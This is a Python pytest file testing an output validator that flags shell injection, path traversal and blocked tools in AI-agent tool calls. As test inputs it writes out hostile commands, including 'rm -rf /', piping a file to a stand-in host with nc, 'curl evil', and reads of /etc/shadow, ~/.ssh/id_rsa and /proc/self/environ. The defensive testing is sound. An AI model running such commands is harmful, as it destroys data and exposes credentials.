"""Tests for OutputValidator (M17 -- P0 test gap)."""

from __future__ import annotations

import pytest

from pylon.safety.output_validator import OutputValidator, ValidationResult


class TestShellInjectionDetection:
    """Shell injection patterns must be detected in tool call arguments."""

    @pytest.fixture
    def validator(self) -> OutputValidator:
        return OutputValidator()

    def test_semicolon_chaining(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "ls; rm -rf /"})
        assert not result.valid
        assert any("Shell injection" in v for v in result.violations)

    def test_pipe(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "cat file | nc evil 80"})
        assert not result.valid

    def test_backtick_execution(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "echo `whoami`"})
        assert not result.valid

    def test_subshell(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "echo $(id)"})
        assert not result.valid

    def test_and_chain(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "true && rm file"})
        assert not result.valid

    def test_or_chain(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "false || curl evil"})
        assert not result.valid

    def test_redirect_to_absolute(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "echo x > /etc/passwd"})
        assert not result.valid

    def test_append_to_absolute(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "echo x >> /var/log/app"})
        assert not result.valid

    def test_variable_expansion(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("run", {"cmd": "echo ${HOME}"})
        assert not result.valid


class TestPathTraversalDetection:
    """Path traversal patterns must be detected."""

    @pytest.fixture
    def validator(self) -> OutputValidator:
        return OutputValidator()

    def test_dot_dot_slash(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("read", {"path": "../../etc/passwd"})
        assert not result.valid
        assert any("Path traversal" in v for v in result.violations)

    def test_home_directory(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("read", {"path": "~/.ssh/id_rsa"})
        assert not result.valid

    def test_etc_absolute(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("read", {"path": "/etc/shadow"})
        assert not result.valid

    def test_proc_filesystem(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("read", {"path": "/proc/self/environ"})
        assert not result.valid

    def test_sys_filesystem(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("read", {"path": "/sys/kernel/something"})
        assert not result.valid


class TestBlockedTools:
    """Blocked tools must be rejected."""

    def test_blocked_tool_rejected(self):
        validator = OutputValidator(blocked_tools=["dangerous_tool"])
        result = validator.validate_tool_call_detailed("dangerous_tool", {})
        assert not result.valid
        assert any("blocked" in v for v in result.violations)

    def test_unblocked_tool_allowed(self):
        validator = OutputValidator(blocked_tools=["dangerous_tool"])
        assert validator.validate_tool_call("safe_tool", {})

    def test_multiple_blocked_tools(self):
        validator = OutputValidator(blocked_tools=["a", "b"])
        assert not validator.validate_tool_call("a", {})
        assert not validator.validate_tool_call("b", {})
        assert validator.validate_tool_call("c", {})


class TestSafeToolCalls:
    """Normal, safe tool calls must be allowed."""

    @pytest.fixture
    def validator(self) -> OutputValidator:
        return OutputValidator()

    def test_simple_read(self, validator: OutputValidator):
        assert validator.validate_tool_call("read_file", {"path": "src/main.py"})

    def test_simple_write(self, validator: OutputValidator):
        assert validator.validate_tool_call("write_file", {"path": "out.txt", "content": "hello"})

    def test_no_args(self, validator: OutputValidator):
        assert validator.validate_tool_call("list_tools", {})

    def test_numeric_arg_allowed(self, validator: OutputValidator):
        assert validator.validate_tool_call("set_timeout", {"seconds": 30})  # type: ignore[arg-type]

    def test_safe_path(self, validator: OutputValidator):
        assert validator.validate_tool_call("read", {"path": "project/src/app.py"})


class TestEdgeCases:
    """Edge cases: empty args, non-string values, combined violations."""

    @pytest.fixture
    def validator(self) -> OutputValidator:
        return OutputValidator()

    def test_empty_args(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed("tool", {})
        assert result.valid
        assert result.violations == []

    def test_non_string_values_skipped(self, validator: OutputValidator):
        result = validator.validate_tool_call_detailed(
            "tool", {"count": 42, "flag": True, "data": [1, 2, 3]}
        )
        assert result.valid

    def test_none_value_skipped(self, validator: OutputValidator):
        # non-string, should be skipped by the validator
        result = validator.validate_tool_call_detailed("tool", {"x": None})  # type: ignore[arg-type]
        assert result.valid

    def test_boolean_return_matches_detailed(self, validator: OutputValidator):
        assert validator.validate_tool_call("safe", {"a": "hello"}) is True
        assert validator.validate_tool_call("run", {"cmd": "ls; rm x"}) is False

    def test_validation_result_dataclass(self):
        r = ValidationResult(valid=True, violations=[])
        assert r.valid
        assert r.violations == []
